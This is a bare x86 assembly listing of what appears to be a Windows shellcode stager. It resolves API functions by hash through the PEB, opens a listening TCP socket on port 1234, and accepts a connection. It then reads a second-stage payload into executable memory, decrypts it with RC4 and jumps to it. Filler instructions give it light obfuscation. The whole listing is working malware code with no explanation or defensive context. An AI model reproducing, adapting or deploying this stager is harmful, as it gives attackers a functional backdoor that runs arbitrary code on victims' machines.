```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    mov edx, 0
    test edx, edx
    mov edx, dword ptr fs:[edx + 0x30]
    lea ebp, [esp]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    movzx ecx, word ptr [edx + 0x26]
    mov esi, dword ptr [edx + 0x28]
    mov edi, 0
    test edi, edi
L_1e:
    mov eax, 0
    test eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    push edx
    mov edx, dword ptr [edx + 0x10]
    push edi
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    mov ecx, dword ptr [eax + 0x18]
    mov ebx, dword ptr [eax + 0x20]
    push eax
    add ebx, edx
L_4b:
    test ecx, ecx
    je L_8b
    dec ecx
    mov edi, 0
    test edi, edi
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
L_57:
    mov eax, 0
    test eax, eax
    lodsb al, byte ptr [esi]
    ror edi, 0xd
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    push 0x3233
    push 0x5f327377
    push esp
    push 0x726774c
    call ebp
    mov eax, 0x190
    sub esp, eax
    push esp
    push eax
    push 0x6b8029
    call ebp
    push 0xb
    pop ecx
L_bb:
    push eax
    loop L_bb
    push 1
    push 2
    push 0xe0df0fea
    call ebp
    xchg edi, eax
    push 0xd2040002
    lea esi, [esp]
    push 0x10
    push esi
    push edi
    push 0x6737dbc2
    call ebp
    test eax, eax
    jne L_1b9
    push edi
    push 0xff38e9b7
    call ebp
    push edi
    push 0xe13bec74
    call ebp
    push edi
    xchg edi, eax
    push 0x614d6e75
    call ebp
    push 0
    push 4
    push esi
    push edi
    push 0x5fc8d902
    call ebp
    cmp eax, 0
    jle L_1b9
    mov esi, dword ptr [esi]
    xor esi, 0xd3a205a0
    lea ecx, [esi + 0x100]
    push 0x40
    push 0x1000
    push ecx
    push 0
    push 0xe553a458
    call ebp
    lea ebx, [eax + 0x100]
    push ebx
    push esi
    push eax
L_13b:
    push 0
    push esi
    push ebx
    push edi
    push 0x5fc8d902
    call ebp
    cmp eax, 0
    jle L_1b9
    add ebx, eax
    sub esi, eax
    jne L_13b
    pop ebx
    pop ecx
    pop ebp
    push ebp
    push edi
    lea edi, [ebx]
    call L_172
    xor al, 0x2a
    push 0x53d0a27e
    pushal
    leave
    push ebx
    adc byte ptr [edx - 0x35], bh
    .byte 0xE8, 0x3E, 0x08
L_172:
    pop esi
    xor eax, eax
L_175:
    stosb
    inc al
    jne L_175
    sub edi, 0x100
    mov ebx, 0
    test ebx, ebx
L_182:
    add bl, byte ptr [edi + eax]
    mov edx, eax
    and dl, 0xf
    add bl, byte ptr [esi + edx]
    mov dl, byte ptr [edi + eax]
    xchg byte ptr [edi + ebx], dl
    mov byte ptr [edi + eax], dl
    inc al
    jne L_182
    mov ebx, 0
    test ebx, ebx
L_19c:
    inc al
    add bl, byte ptr [edi + eax]
    mov dl, byte ptr [edi + eax]
    xchg byte ptr [edi + ebx], dl
    mov byte ptr [edi + eax], dl
    add dl, byte ptr [edi + ebx]
    mov dl, byte ptr [edi + edx]
    xor byte ptr [ebp], dl
    inc ebp
    dec ecx
    jne L_19c
    pop edi
    ret
L_1b9:
    mov ebx, 0x56a2b5f0
    push 0
    push ebx
    call ebp
```